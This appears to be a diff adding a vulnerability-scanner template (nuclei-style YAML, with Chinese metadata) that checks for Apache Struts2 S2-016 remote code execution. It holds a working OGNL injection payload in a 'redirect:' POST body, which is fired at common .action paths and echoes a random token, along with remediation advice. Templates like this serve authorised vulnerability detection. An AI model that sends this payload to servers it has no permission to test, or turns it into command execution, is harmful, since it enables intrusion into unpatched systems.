@@ -1,0 +1,45 @@
+id: S2-016
+info:
+  name: Apache Struts2 S2-016远程代码执行
+  author:
+  - 折跃
+  description: |-
+    Struts2 S2-016 远程代码执行
+    Apache Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令
+
+    redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts 2.3.15.1以下版本均存在此漏洞
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    厂商已经发布Apache Struts 2.3.15.1以修复此安全漏洞，建议Struts用户及时升级到最新版本。
+    厂商安全公告：S2-016 链接：[http://struts.apache.org/release/2.3.x/docs/s2-016.html](http://struts.apache.org/release/2.3.x/docs/s2-016.html)
+    软件升级页面：[http://struts.apache.org/download.cgi#struts23151](http://struts.apache.org/download.cgi#struts23151)
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,verify)
+  raw:
+  - |
+    POST {{tmpPath}} HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22{{verify}}%22),%23p.close()}
+  attack: clusterbomb
+  payloads:
+    tmpPath:
+    - /
+    - /index.action
+    - /login.action
+    - /default.action
+    - /admin.action
+    - /user.action
+  redirects: true
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
